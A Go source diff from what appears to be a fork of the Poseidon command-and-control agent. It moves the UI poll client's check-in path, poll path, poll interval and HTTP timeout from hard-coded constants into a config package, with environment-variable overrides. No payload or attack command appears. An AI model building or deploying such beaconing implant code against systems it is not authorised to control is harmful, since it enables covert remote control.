@@ -8,20 +8,13 @@ import (
 	"strconv"
 	"time"
 
+	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/config"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/responses"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/tasks"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/ui/pollclient"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/files"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/p2p"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/structs"
-)
-
-const (
-	defaultBaseURL       = "http://localhost:8080"
-	defaultCheckinPath   = "/checkin"
-	defaultPollPath      = "/poll"
-	defaultPollIntervalS = 5
-	httpTimeoutSeconds   = 30
 )
 
 func main() {
@@ -41,17 +34,18 @@ func main() {
 }
 
 func buildClientFromEnv() *pollclient.Client {
-	baseURL := getenvDefault("POSEIDON_UI_BASEURL", defaultBaseURL)
-	checkinPath := getenvDefault("POSEIDON_UI_CHECKIN_PATH", defaultCheckinPath)
-	pollPath := getenvDefault("POSEIDON_UI_POLL_PATH", defaultPollPath)
-	pollInterval := time.Duration(defaultPollIntervalS) * time.Second
+	// Use config package values as defaults, allow env var overrides
+	baseURL := getenvDefault("POSEIDON_UI_BASEURL", config.UIBaseURL)
+	checkinPath := getenvDefault("POSEIDON_UI_CHECKIN_PATH", config.UICheckinPath)
+	pollPath := getenvDefault("POSEIDON_UI_POLL_PATH", config.UIPollPath)
+	pollInterval := time.Duration(config.UIPollInterval) * time.Second
 	if v := os.Getenv("POSEIDON_UI_POLL_INTERVAL_SECONDS"); v != "" {
 		if n, err := strconv.Atoi(v); err == nil && n > 0 {
 			pollInterval = time.Duration(n) * time.Second
 		}
 	}
 
-	httpClient := &http.Client{Timeout: httpTimeoutSeconds * time.Second}
+	httpClient := &http.Client{Timeout: time.Duration(config.UIHTTPTimeout) * time.Second}
 
 	return pollclient.New(pollclient.Config{
 		BaseURL:     baseURL,
